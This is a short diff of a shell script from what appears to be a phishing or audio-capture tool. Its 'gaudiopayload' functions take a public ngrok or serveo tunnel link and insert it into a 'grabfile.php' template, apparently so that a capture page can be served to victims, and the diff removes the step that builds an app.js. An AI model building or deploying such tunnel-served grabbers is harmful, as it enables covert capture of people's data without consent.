@@ -498,14 +498,12 @@ fi
 gaudiopayload_ngrok() {
 
 gaudiongrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+server_link+'$gaudiongrok_link'+g' .server/audiofile/.app.js > .server/audiofile/app.js
 sed 's+server_link+'$gaudiongrok_link'+g' .server/audiofile/grabfile.php > .server/audiofile/index.php
 
 }
 gaudiopayload_serveo() {
 
 gaudioserveo_link=$(grep -o "https://[0-9a-z]*\.serveo.net" .grablink)
-sed 's+server_link+'$gaudioserveo_link'+g' .server/audiofile/.app.js > .server/audiofile/app.js
 sed 's+server_link+'$gaudioserveo_link'+g' .server/audiofile/grabfile.php > .server/audiofile/index.php
 
 }
